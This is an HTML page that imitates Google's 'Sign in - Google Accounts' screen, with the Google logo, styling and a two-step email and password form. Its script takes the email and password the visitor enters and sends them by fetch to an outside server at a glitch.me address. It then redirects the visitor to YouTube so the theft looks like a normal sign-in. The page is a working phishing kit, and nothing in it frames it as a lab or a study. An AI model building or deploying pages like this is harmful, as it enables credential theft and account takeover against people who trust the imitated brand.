<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in - Google Accounts</title>
    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Google Sans', Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background: #fff;
            color: #202124;
            font-size: 14px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .header {
            padding: 16px;
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: flex-end;
        }

        .container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 24px 16px 0;
            width: 100%;
            max-width: 450px;
            margin: 0 auto;
        }

        .logo {
            width: 92px;
            margin-bottom: 24px;
        }

        .login-box {
            width: 100%;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 24px 16px;
            position: relative;
        }

        .login-header {
            text-align: center;
            margin-bottom: 24px;
        }

        h1 {
            font-size: 22px;
            font-weight: 400;
            line-height: 1.3333;
            margin-bottom: 8px;
        }

        .subheader {
            font-size: 15px;
            font-weight: 400;
            color: #5f6368;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .input-field {
            width: 100%;
            height: 56px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 13px 15px;
            font-size: 16px;
            color: #202124;
            transition: border-color 0.2s;
            -webkit-appearance: none;
        }

        .input-field:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }

        .input-field::placeholder {
            color: #80868b;
            font-size: 15px;
        }

        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            margin-top: 8px;
            display: inline-block;
            font-size: 14px;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
        }

        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            font-size: 14px;
            min-width: 80px;
            text-align: center;
            touch-action: manipulation;
        }

        .next-button:hover {
            background: #1557b0;
        }

        .footer {
            padding: 24px 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #757575;
            font-size: 12px;
            margin-top: auto;
            text-align: center;
        }

        .footer select, .footer a {
            color: #757575;
            text-decoration: none;
            margin: 0 8px;
        }

        .password-field {
            position: relative;
        }

        .show-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #757575;
            padding: 8px;
            touch-action: manipulation;
        }

        .user-image {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            margin: 0 auto 16px;
            display: block;
            background: #1a73e8;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 18px;
        }

        .back-link {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            position: absolute;
            top: 16px;
            left: 16px;
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 14px;
        }

        @media (max-width: 368px) {
            .login-box {
                border: none;
                padding: 0;
            }
            
            .container {
                padding-top: 16px;
            }
            
            .logo {
                margin-bottom: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-right">
            <a href="#" class="signin-link">Sign in</a>
        </div>
    </div>

    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
        
        <div class="login-box" id="emailBox">
            <div class="login-header">
                <h1>Sign in</h1>
                <div class="subheader">Use your Google Account</div>
            </div>

            <div class="form-group">
                <input type="email" class="input-field" id="email" placeholder="Email or phone" autofocus>
            </div>

            <a href="#" class="forgot-email">Forgot email?</a>

            <div class="button-group">
                <a href="#" class="create-account">Create account</a>
                <button class="next-button" id="nextEmail" disabled>Next</button>
            </div>
        </div>

        <div class="login-box" id="passwordBox" style="display: none;">
            <a href="#" class="back-link" onclick="showEmailPage()">
                <span class="material-icons">arrow_back</span>
                Back
            </a>
            <div class="login-header">
                <div class="user-image">A</div>
                <h1>Welcome</h1>
                <div class="subheader" id="userEmail">user@example.com</div>
            </div>

            <div class="form-group password-field">
                <input type="password" class="input-field" id="password" placeholder="Enter your password" autofocus>
                <button class="show-password" onclick="togglePassword()">
                    <span class="material-icons" id="visibilityIcon">visibility_off</span>
                </button>
            </div>

            <a href="#" class="forgot-email">Forgot password?</a>

            <div class="button-group">
                <a href="#" class="create-account" onclick="showEmailPage()">Sign in with different account</a>
                <button class="next-button" id="nextPassword" disabled>Next</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div style="margin-bottom: 8px;">
            <select>
                <option>English (United States)</option>
            </select>
        </div>
        <div>
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        const emailInput = document.getElementById('email');
        const nextEmailButton = document.getElementById('nextEmail');
        const passwordInput = document.getElementById('password');
        const nextPasswordButton = document.getElementById('nextPassword');
        const emailBox = document.getElementById('emailBox');
        const passwordBox = document.getElementById('passwordBox');
        const userEmailDisplay = document.getElementById('userEmail');

        emailInput.addEventListener('input', () => {
            nextEmailButton.disabled = !emailInput.value.trim();
        });

        passwordInput.addEventListener('input', () => {
            nextPasswordButton.disabled = !passwordInput.value.trim();
        });

        document.getElementById('nextEmail').addEventListener('click', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            if (validateEmail(email)) {
                emailBox.style.display = 'none';
                passwordBox.style.display = 'block';
                userEmailDisplay.textContent = email;
            }
        });

        document.getElementById('nextPassword').addEventListener('click', (e) => {
            e.preventDefault();
            const email = emailInput.value;
            const password = passwordInput.value;

            // Send the email and password to the backend (Glitch URL)
            fetch('https://silver-clumsy-lotus.glitch.me/auth/demo', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    // On success, redirect the user
                    window.location.href = 'https://www.youtube.com';
                } else {
                    // On failure, show the error message
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Something went wrong!');
            });
        });

        function validateEmail(email) {
            return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
        }

        function showEmailPage() {
            emailBox.style.display = 'block';
            passwordBox.style.display = 'none';
        }

        function togglePassword() {
            const passwordField = document.getElementById('password');
            const icon = document.getElementById('visibilityIcon');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                icon.textContent = 'visibility';
            } else {
                passwordField.type = 'password';
                icon.textContent = 'visibility_off';
            }
        }
    </script>
</body>
</html>
